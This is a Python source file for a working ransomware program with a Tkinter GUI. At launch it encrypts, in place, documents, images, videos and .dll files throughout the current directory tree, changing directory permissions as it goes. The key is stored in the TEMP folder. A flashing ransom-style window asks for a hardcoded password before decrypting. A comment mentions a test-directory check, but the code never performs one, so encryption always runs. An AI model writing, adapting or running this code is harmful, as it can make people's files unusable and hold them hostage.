import os
import tkinter as tk
import sys
import stat
from tkinter import messagebox
from cryptography.fernet import Fernet, InvalidToken


#function to generate encryption key in TEMP folder
def generate_encryption_key():
    key = Fernet.generate_key()

    temp_dir = os.environ.get('TEMP') or os.environ.get('TMP')  #try to get TEMP or TMP environment variable
    if not temp_dir:
        temp_dir = '.'  #use current directory as a fallback if TEMP and TMP are not set

    key_path = os.path.join(temp_dir, "encryption.key")

    with open(key_path, "wb") as encryptionkey:
        encryptionkey.write(key)

#load encryption key if it exists. generate one if it doesnt
def load_encryption_key():
    temp_dir = os.environ.get('TEMP') or os.environ.get('TMP')
    if not temp_dir:
        temp_dir = '.' 

    key_path = os.path.join(temp_dir, "encryption.key")

    if not os.path.exists(key_path):
        generate_encryption_key()

    with open(key_path, "rb") as encryptionkey:
        key = encryptionkey.read()

    return key

#function to encrypt all given file extensions in the current directory
ALLOWED_EXTENSIONS = {'.txt', '.jpg', '.jpeg', '.png', '.docx', '.xlsx', '.pdf', '.dll', '.mp4', '.webp'}


def encrypt_files():
    key = load_encryption_key()
    total_files_encrypted = 0

    # Recorre el directorio actual y sus subdirectorios
    for root, directories, filenames in os.walk('.'):
        # Cambia los permisos del directorio actual
        try:
            os.chmod(root, stat.S_IRWXU)
        except Exception as e:
            print(f"Error cambiando permisos de directorio {root}: {e}")

        # Cifra los archivos en el directorio actual
        for filename in filenames:
            filepath = os.path.join(root, filename)
            _, file_extension = os.path.splitext(filepath)
            if file_extension.lower() in ALLOWED_EXTENSIONS:
                try:
                    with open(filepath, "rb") as thefile:
                        contents = thefile.read()
                    contents_encrypted = Fernet(key).encrypt(contents)

                    with open(filepath, "wb") as thefile:
                        thefile.write(contents_encrypted)

                    total_files_encrypted += 1
                except Exception as e:
                    print(f"Error cifrando {filepath}: {e}")

    # Muestra el número total de archivos cifrados sin listar sus nombres
    result_label.config(text=f"Total files encrypted: {total_files_encrypted}", fg="yellow", bg="red")




#function to decrypt all files in the current directory
def decrypt_files():
    password = pw_entry.get()
    correct_password = "12345"

    if password == correct_password:
        key = load_encryption_key()
        files = []

        # Recorre el directorio actual y sus subdirectorios
        for root, directories, filenames in os.walk('.'):
            for filename in filenames:
                if filename == "encrypt.py" or filename == "encryption.key" or filename == "encrypt.exe" or filename == "encrypt.pyw":
                    continue
                _, file_extension = os.path.splitext(filename)
                if file_extension.lower() in ALLOWED_EXTENSIONS:
                    files.append(os.path.join(root, filename))

        # Mostrar un indicador de procesamiento
        result_label.config(text="Decrypting files...", fg="blue")

        # Procesar los archivos
        for file in files:
            try:
                with open(file, "rb") as thefile:
                    contents = thefile.read()
                contents_decrypted = Fernet(key).decrypt(contents)
                with open(file, "wb") as thefile:
                    thefile.write(contents_decrypted)

                result_label.config(text=f"Congratulats you have been decrypted", fg="green", bg=bg_color)
              
            except InvalidToken:
                result_label.config(text="No files to decrypt", fg="black")
    else:
        result_label.config(text="Incorrect password", fg="red", bg=bg_color)




def color_change():
    current_bg_color = message_label.cget("bg")
    if current_bg_color == "red":
        message_label.config(bg="yellow")
    else:
        message_label.config(bg="red")
    root.after(1000, color_change)

#check if launched from within "TestDirz338" directory

	
root = tk.Tk()
root.title("WE'R SCREWED")
root.geometry("1000x700")
bg_color = root.cget("bg")

message_label = tk.Label(root, text="Unfortunately you've been hit by a ransomware :( 👍", wraplength=450, width=45, font=("Arial", 20))
message_label.pack(pady=30)
color_change()


result_label = tk.Label(root, text="", font=("Arial", 20), wraplength=350, width=40)
result_label.pack(pady=55)

pw_label = tk.Label(root, text="Enter secret password to decrypt files", font=("Arial", 15))
pw_label.pack(pady=2)

pw_entry = tk.Entry(root, width=15, font=("Arial", 15), show="*")
pw_entry.pack(pady=2)

decrypt_button = tk.Button(root, text="Decrypt Files", font=("Arial", 14), command=decrypt_files)
decrypt_button.pack(pady=5)

encrypt_files()

root.mainloop()
